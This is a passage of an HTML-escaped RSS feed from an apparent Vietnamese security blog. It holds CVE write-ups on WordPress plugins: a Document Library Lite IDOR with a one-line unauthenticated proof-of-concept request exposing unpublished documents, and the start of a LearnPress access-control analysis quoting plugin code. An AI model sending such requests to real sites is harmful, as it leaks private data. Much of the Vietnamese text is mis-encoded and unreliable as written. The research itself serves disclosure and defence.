href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Unauthenticated user&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-admin/admin-ajax.php?action=dll_load_posts with args[status]=pending|draft|future|any&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_nopriv_dll_load_posts hook triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Ajax_Handler::load_posts()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Read user-controlled $_POST[&amp;#39;args&amp;#39;]&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Options::handle_shortcode_attribute_aliases()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Merge with default options via shortcode_atts()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Initialize simple_Document_Library($args)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;validate_options(): only validate value, no permission check&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;status accepted: publish/pending/draft/future/any&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Build query using user-controlled status&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Query documents including non-public ones&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;get_table(&amp;#39;array&amp;#39;)&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;wp_send_json(response)&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Non-public documents returned to user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G·ª≠i request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=dll_load_posts&amp;amp;args[status]=any&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/result.png&#39; alt=&#34;Result&#34; height=&#34;856&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra do AJAX endpoint c√¥ng khai tin t∆∞·ªüng tham s·ªë &lt;code&gt;status&lt;/code&gt; do client ki·ªÉm so√°t v√† s·ª≠ d·ª•ng tr·ª±c ti·∫øp ƒë·ªÉ truy v·∫•n document m√† kh√¥ng ki·ªÉm tra quy·ªÅn. ƒêi·ªÅu n√†y cho ph√©p ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p truy c·∫≠p c√°c document ch∆∞a ƒë∆∞·ª£c c√¥ng khai, d·∫´n ƒë·∫øn bypass ki·ªÉm so√°t truy c·∫≠p / IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Validation kh√¥ng thay th·∫ø cho authorization&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; l√† b·ªÅ m·∫∑t t·∫•n c√¥ng c√¥ng khai&lt;/li&gt;&#xA;&lt;li&gt;Tham s·ªë ·∫£nh h∆∞·ªüng truy v·∫•n ph·∫£i ƒë∆∞·ª£c r√†ng bu·ªôc theo quy·ªÅn&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫£ JSON kh√¥ng ki·ªÉm so√°t quy·ªÅn c√≥ th·ªÉ g√¢y r√≤ r·ªâ d·ªØ li·ªáu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/document-library-lite/vulnerability/wordpress-document-library-lite-plugin-1-1-7-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Document Library Lite Plugin &amp;lt;= 1.1.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13956 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-16-cve-2025-13956/</link>
      <pubDate>Tue, 16 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-16-cve-2025-13956/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-16-cve-2025-13956/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LearnPress ‚Äì WordPress LMS Plugin&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; b·ªã &lt;strong&gt;l·ªó h·ªïng truy c·∫≠p tr√°i ph√©p d·ªØ li·ªáu&lt;/strong&gt; do &lt;strong&gt;thi·∫øu ki·ªÉm tra quy·ªÅn (capability check)&lt;/strong&gt; trong &lt;strong&gt;ch·ª©c nƒÉng th·ªëng k√™&lt;/strong&gt; ·ªü &lt;strong&gt;t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 4.3.1&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c&lt;/strong&gt; xem &lt;strong&gt;th·ªëng k√™ ƒë∆°n h√†ng&lt;/strong&gt; c·ªßa plugin, bao g·ªìm &lt;strong&gt;t·ªïng doanh thu&lt;/strong&gt; v√† &lt;strong&gt;s·ªë l∆∞·ª£ng tr·∫°ng th√°i ƒë∆°n h√†ng&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13956&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13956&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/learnpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LearnPress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.2&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;  &amp;#39;init&amp;#39;,&#xA;  function () {&#xA;    LoadContentViaAjax::catch_lp_ajax();&#xA;    LessonAjax::catch_lp_ajax();&#xA;    EditCurriculumAjax::catch_lp_ajax();&#xA;    EditQuizAjax::catch_lp_ajax();&#xA;    EditQuestionAjax::catch_lp_ajax();&#xA;    SendEmailAjax::catch_lp_ajax();&#xA;    OpenAiAjax::catch_lp_ajax();&#xA;&#xA;    do_action( &amp;#39;learn-press/register-ajax-handlers&amp;#39; );&#xA;  },&#xA;  11&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;init&lt;/code&gt; hook l√† hook kh·ªüi t·∫°o s·ªõm c·ªßa WordPress, ƒë∆∞·ª£c ch·∫°y sau khi WordPress t·∫£i xong c√°c th√†nh ph·∫ßn c·ªët l√µi nh∆∞ng tr∆∞·ªõc khi g·ª≠i output ra tr√¨nh duy·ªát =&amp;gt; B·∫•t k√¨ request c·ªßa b·∫•t k·ª≥ user n√†o c≈©ng k√≠ch ho·∫°t ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;function () {}&lt;/code&gt; l√† h√†m ·∫©n danh ƒë∆∞·ª£c ƒë·∫∑t l√†m callback cho hook n√†y.&lt;/p&gt;&#xA;&lt;p&gt;·ªû d√≤ng th·ª© 4, h√†m tƒ©nh &lt;code&gt;LoadContentViaAjax:catch_lp_ajax()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi t·ª´ class &lt;code&gt;LoadContentViaAjax&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax { ... }&#xA;&#xA;abstract class AbstractAjax {&#xA;&#x9;public static function catch_lp_ajax() {&#xA;&#x9;&#x9;if ( ! empty( $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;] ) ) {&#xA;&#x9;&#x9;&#x9;$action = $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;];&#xA;&#x9;&#x9;&#x9;$nonce  = $_REQUEST[&amp;#39;nonce&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;&#x9;$class  = new static();&#xA;&#xA;&#x9;&#x9;&#x9;// For case cache html, so cache nonce is not required.&#xA;&#x9;&#x9;&#x9;$class_no_nonce = [&#xA;&#x9;&#x9;&#x9;&#x9;LoadContentViaAjax::class,&#xA;&#x9;&#x9;&#x9;];&#xA;&#xA;&#x9;&#x9;&#x9;if ( ! wp_verify_nonce( $nonce, &amp;#39;wp_rest&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;if ( ! in_array( get_class( $class ), $class_no_nonce ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;wp_die( &amp;#39;Invalid request!&amp;#39;, 400 );&#xA;&#x9;&#x9;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;// Allow to handle without nonce, but must same domain.&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;$referer = wp_get_referer();&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;if ( empty( $referer ) || strpos( $referer, home_url() ) !== 0 ) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;wp_die( &amp;#39;Invalid request!&amp;#39;, 400 );&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;if ( is_callable( [ $class, $action ] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;call_user_func( [ $class, $action ] );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Class k·∫ø th·ª´a&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;‚Üí &lt;code&gt;LoadContentViaAjax&lt;/code&gt; k·∫ø th·ª´a to√†n b·ªô logic x·ª≠ l√Ω AJAX t·ª´ &lt;code&gt;AbstractAjax&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Hook &lt;code&gt;init&lt;/code&gt; g·ªçi &lt;code&gt;catch_lp_ajax()&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Khi WordPress ch·∫°y t·ªõi hook &lt;code&gt;init&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;LoadContentViaAjax::catch_lp_ajax()&lt;/code&gt; ƒë∆∞·ª£c th·ª±c thi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Ki·ªÉm tra request&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;‚Üí Ch·ªâ x·ª≠ l√Ω khi request c√≥ tham s·ªë &lt;code&gt;lp-load-ajax&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;X√°c ƒë·ªãnh h√†nh ƒë·ªông&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$action = $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;‚Üí Gi√° tr·ªã n√†y ƒë∆∞·ª£c coi l√† &lt;strong&gt;t√™n method&lt;/strong&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi trong class con.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kh·ªüi t·∫°o object&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$class = new static();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;‚Üí &lt;code&gt;static&lt;/code&gt; tr·ªè t·ªõi class ƒëang g·ªçi (&lt;code&gt;LoadContentViaAjax&lt;/code&gt;), n√™n t·∫°o instance c·ªßa class ƒë√≥.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;X·ª≠ l√Ω nonce&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L·∫•y &lt;code&gt;nonce&lt;/code&gt; t·ª´ request&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra b·∫±ng &lt;code&gt;wp_verify_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Ri√™ng &lt;code&gt;LoadContentViaAjax&lt;/code&gt; ƒë∆∞·ª£c ph√©p &lt;strong&gt;b·ªè qua nonce&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Khi b·ªè qua nonce th√¨ ki·ªÉm tra &lt;code&gt;referer&lt;/code&gt; c√πng domain.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;G·ªçi method t∆∞∆°ng ·ª©ng&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_callable( [ $class, $action ] ) ) {&#xA;    call_user_func( [ $class, $action ] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;‚Üí N·∫øu trong &lt;code&gt;LoadContentViaAjax&lt;/code&gt; c√≥ method tr√πng t√™n v·ªõi gi√° tr·ªã &lt;code&gt;lp-load-ajax&lt;/code&gt;&#xA;‚Üí Method ƒë√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi v√† th·ª±c thi.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax {&#xA;&#x9;public function load_content_via_ajax() {&#xA;&#x9;&#x9;$response = new LP_REST_Response();&#xA;&#xA;&#x9;&#x9;try {&#xA;&#x9;&#x9;&#x9;$params = wp_unslash( $_REQUEST[&amp;#39;data&amp;#39;] ?? &amp;#39;&amp;#39; );&#xA;&#x9;&#x9;&#x9;if ( empty( $params ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$params = LP_Helper::json_decode( $params, true );&#xA;&#xA;&#x9;&#x9;&#x9;if ( empty( $params[&amp;#39;callback&amp;#39;] ) ||&#xA;&#x9;&#x9;&#x9;&#x9;! isset( $params[&amp;#39;args&amp;#39;] 